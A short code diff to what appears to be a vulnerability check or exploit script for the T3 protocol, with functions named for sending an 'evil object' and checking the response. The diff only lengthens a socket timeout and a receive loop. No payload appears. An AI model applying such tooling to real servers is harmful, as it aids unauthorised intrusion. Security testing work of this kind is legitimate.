@@ -42,7 +42,7 @@ def sendEvilObjData(sock,data):
     res = ''
     try:
         count = 0
-        while count<5:
+        while count<10:
             res += sock.recv(4096).decode("utf8","ignore")
             time.sleep(0.1)
             count += 1
@@ -59,7 +59,7 @@ def checkVul(res,rip,rport):
 
 def run(rip,rport):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(10)
+    sock.settimeout(20)
     server_addr = (rip, rport)
     t3handshake(sock,server_addr)
     buildT3RequestObject(sock,rport)
